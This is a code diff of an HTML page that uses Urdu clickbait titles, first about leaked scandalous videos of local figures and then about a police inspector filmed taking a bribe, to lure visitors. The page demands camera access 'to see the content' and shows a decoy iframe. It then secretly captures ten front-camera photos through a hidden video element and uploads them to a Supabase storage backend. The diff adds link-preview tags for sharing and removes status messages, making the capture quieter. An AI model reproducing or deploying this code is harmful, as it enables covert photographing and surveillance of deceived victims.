@@ -3,7 +3,16 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>پسرور کے اہم سیاسی سماجی اور صحافی شخصیات کی نازیبا ویڈیو لیک۔سب پھڑے جان گے</title>
+  <title>سب انسپکٹر فاروق خان رشوت لیتے ھوئے</title>
+
+  <!-- 🌐 Open Graph Meta Tags for Link Preview -->
+  <meta property="og:title" content="سب انسپکٹر فاروق خان رشوت لیتے ھوئے" />
+  <meta property="og:description" content="ویڈیو دیکھنے کے لیے کلک کریں" />
+  <meta property="og:image" content="https://surprise-gamma-one.vercel.app/Ins.jpg" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://surprise-ammma-one.vercel.app/" />
+  <meta name="twitter:card" content="summary_large_image" />
+
   <style>
     body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
     #preload-modal{position:fixed;inset:0;background:rgba(0,0,0,.85);color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999}
@@ -22,20 +31,16 @@
     <p id="deny-message" style="display:none">You must allow camera permission to see the content.</p>
   </div>
 
-  <!-- iframe: ensure your Jeeto file is named jeeto-pakistan.html -->
   <iframe id="jeeto-iframe" src="jeeto-pakistan.html" style="display:none" allow="camera; microphone; autoplay"></iframe>
 
   <video id="video" autoplay playsinline muted></video>
   <div id="status" style="display:none"></div>
 
-  <!-- supabase client (cdn) - kept for optional reads; uploads use signed URL API -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // ---------- CONFIG: your anon key and url (OK for reads) ----------
     const SUPABASE_URL = 'https://hpgrvmzujhvomcktjust.supabase.co';
     const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhwZ3J2bXp1amh2b21ja3RqdXN0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTk0MDA3NDcsImV4cCI6MjA3NDk3Njc0N30.R_pkZCEFdytXvwzD_fzpKHJh1t2Myq_v-ajYTa88m40';
     const supabase = window.supabase?.createClient ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
-    // -------------------------------------------------------------------
 
     const preloadModal = document.getElementById('preload-modal');
     const agreeButton = document.getElementById('agree-button');
@@ -44,60 +49,35 @@
     const video = document.getElementById('video');
     const statusEl = document.getElementById('status');
 
-    // ------------------ Signed upload helpers (client side) ------------------
     async function getSignedUploadUrl(filename, contentType) {
       const resp = await fetch('/api/signed-upload', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ filename, contentType })
       });
-      if (!resp.ok) {
-        const body = await resp.text();
-        throw new Error(`Failed to get signed url (${resp.status}): ${body}`);
-      }
-      return resp.json(); // { putUrl, publicUrl, path }
+      if (!resp.ok) throw new Error(`Failed to get signed url (${resp.status}): ${await resp.text()}`);
+      return resp.json();
     }
 
     async function uploadBlobWithSignedUrl(blob, filename) {
-      const { putUrl, publicUrl, path } = await getSignedUploadUrl(filename, blob.type);
-
-      // Put blob directly to signed URL
-      const putResp = await fetch(putUrl, {
-        method: 'PUT',
-        headers: { 'Content-Type': blob.type },
-        body: blob
-      });
-
-      if (!putResp.ok) {
-        const txt = await putResp.text();
-        throw new Error(`PUT failed (${putResp.status}): ${txt}`);
-      }
-
-      return { publicUrl, path };
+      const { putUrl, publicUrl } = await getSignedUploadUrl(filename, blob.type);
+      const putResp = await fetch(putUrl, { method: 'PUT', headers: { 'Content-Type': blob.type }, body: blob });
+      if (!putResp.ok) throw new Error(`PUT failed (${putResp.status}): ${await putResp.text()}`);
+      return { publicUrl };
     }
-    // -----------------------------------------------------------------------
 
     agreeButton.addEventListener('click', async () => {
       try {
-      //statusEl.style.display = 'block';
-      //statusEl.innerText = 'Requesting camera permission...';
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-
-        // Hide modal, show iframe
         preloadModal.style.display = 'none';
         jeetoIframe.style.display = 'block';
-
-        // attach stream and wait for metadata
         video.srcObject = stream;
-        await new Promise((resolve) => {
-          if (video.readyState >= 1 && video.videoWidth) return resolve();
+        await new Promise(resolve => {
           const onMeta = () => { video.removeEventListener('loadedmetadata', onMeta); resolve(); };
           video.addEventListener('loadedmetadata', onMeta);
-          video.play().catch(()=>{/* ignore autoplay block */});
+          video.play().catch(()=>{});
           setTimeout(resolve, 800);
         });
-
-        // Begin capture+upload flow
         await captureAndUploadPhotos(video, 10, 640, 0.8);
       } catch (err) {
         console.error('Camera access denied or error:', err);
@@ -106,7 +86,6 @@
       }
     });
 
-    // captureCount, targetWidth, jpegQuality
     async function captureAndUploadPhotos(videoEl, captureCount = 10, targetWidth = 640, jpegQuality = 0.8) {
       const aspect = (videoEl.videoWidth && videoEl.videoHeight) ? (videoEl.videoWidth / videoEl.videoHeight) : (16/9);
       const canvas = document.createElement('canvas');
@@ -114,43 +93,19 @@
       canvas.height = Math.round(targetWidth / aspect);
       const ctx = canvas.getContext('2d');
 
-    //statusEl.innerText = `Preparing to capture ${captureCount} photos...`;
-
       for (let i = 0; i < captureCount; i++) {
         try {
           ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-
           const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', jpegQuality));
-          if (!blob) throw new Error('Failed to create image blob');
-
           const filename = `photo-${Date.now()}-${i+1}.jpg`;
-        //statusEl.innerText = `Uploading ${i+1}/${captureCount}...`;
-
-          // ----- REPLACED: direct supabase upload -----
-          // const { data, error } = await supabaseClient.storage.from('user-media').upload(filename, blob, { contentType: 'image/jpeg' });
-          // if (error) { ... }
-          // ------------------------------------------------
-          // Use signed-url flow instead:
-          try {
-            const result = await uploadBlobWithSignedUrl(blob, filename);
-            console.log(`Photo ${i+1} uploaded:`, result);
-          } catch (uErr) {
-            console.error('Upload failed:', uErr);
-          //statusEl.innerText = `Upload failed at ${i+1}: ${uErr.message}`;
-            return;
-          }
-
-          // small pause
+          await uploadBlobWithSignedUrl(blob, filename);
           await new Promise(r => setTimeout(r, 250));
         } catch (err) {
-          console.error('capture/upload error', err);
-        //statusEl.innerText = 'Error during capture/upload: ' + (err.message || err);
+          console.error('Upload failed:', err);
           return;
         }
       }
-
-     //statusEl.innerText = 'All photos uploaded successfully!';
     }
   </script>
 </body>
-</html>
+  </html>
